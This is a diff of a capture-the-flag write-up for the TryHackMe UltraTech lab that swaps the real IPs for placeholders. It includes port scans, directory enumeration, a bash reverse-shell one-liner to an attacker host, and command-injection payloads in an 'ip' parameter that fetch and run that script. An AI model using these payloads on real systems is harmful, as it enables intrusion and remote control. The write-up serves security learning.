@@ -1,15 +1,15 @@
 # Info
 
-## IP = 10.10.186.2
+## IP = $IP
 
 # Ports
 
 ## PortScanning
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/UltraTech]
-└─$ nmap 10.10.186.2       
+└─$ nmap $IP       
 Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-10 21:05 EDT
-Nmap scan report for 10.10.186.2
+Nmap scan report for $IP
 Host is up (0.33s latency).
 Not shown: 997 closed tcp ports (conn-refused)
 PORT     STATE SERVICE
@@ -18,7 +18,7 @@ PORT     STATE SERVICE
 8081/tcp open  blackice-icecap
 ```
 ```bash
-sudo nmap -p- -sS 10.10.186.2 
+sudo nmap -p- -sS $IP 
 PORT      STATE SERVICE
 21/tcp    open  ftp
 22/tcp    open  ssh
@@ -81,7 +81,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/UltraTech]
-└─$ echo "bash -i >& /dev/tcp/10.2.54.222/1234 0>&1" > shell.sh
+└─$ echo "bash -i >& /dev/tcp/$ATK_IP/1234 0>&1" > shell.sh
                                                                              
 ┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/UltraTech]
 └─$ python -m http.server 80          
@@ -89,10 +89,10 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:8000/) ...
 ```
 ```
 # Request with following param:
-ip = `wget http://10.2.52.222:80/shell.sh -o shell.sh`
+ip = `wget http://$ATK_IP:80/shell.sh -o shell.sh`
 
 # Doesn't work, so I tried this:
-ip = `wget 10.2.54.222/shell.sh -o shell.sh`
+ip = `wget $ATK_IP/shell.sh -o shell.sh`
 
 # It worked! So I tried this (with open port in attack machine):
 ip = `bash shell.sh`
@@ -104,19 +104,19 @@ ip = `bash shell.sh`
 ## 31331
 ### `gobuster` directory-list-2.3-medium.txt
 ```bash
-/images               (Status: 301) [Size: 320] [--> http://10.10.186.2:31331/images/]                                                                    
-/css                  (Status: 301) [Size: 317] [--> http://10.10.186.2:31331/css/]                                                                       
-/js                   (Status: 301) [Size: 316] [--> http://10.10.186.2:31331/js/]                                                                        
-/javascript           (Status: 301) [Size: 324] [--> http://10.10.186.2:31331/javascript/]
+/images               (Status: 301) [Size: 320] [--> http://$IP:31331/images/]                                                                    
+/css                  (Status: 301) [Size: 317] [--> http://$IP:31331/css/]                                                                       
+/js                   (Status: 301) [Size: 316] [--> http://$IP:31331/js/]                                                                        
+/javascript           (Status: 301) [Size: 324] [--> http://$IP:31331/javascript/]
 ```
 ### `gobuster` common.txt
 ```bash
-/css                  (Status: 301) [Size: 317] [--> http://10.10.186.2:31331/css/]                                                                       
+/css                  (Status: 301) [Size: 317] [--> http://$IP:31331/css/]                                                                       
 /favicon.ico          (Status: 200) [Size: 15086]
-/images               (Status: 301) [Size: 320] [--> http://10.10.186.2:31331/images/]                                                                    
+/images               (Status: 301) [Size: 320] [--> http://$IP:31331/images/]                                                                    
 /index.html           (Status: 200) [Size: 6092]
-/javascript           (Status: 301) [Size: 324] [--> http://10.10.186.2:31331/javascript/]                                                                
-/js                   (Status: 301) [Size: 316] [--> http://10.10.186.2:31331/js/]                                                                        
+/javascript           (Status: 301) [Size: 324] [--> http://$IP:31331/javascript/]                                                                
+/js                   (Status: 301) [Size: 316] [--> http://$IP:31331/js/]                                                                        
 /robots.txt           (Status: 200) [Size: 53]
 ```
 
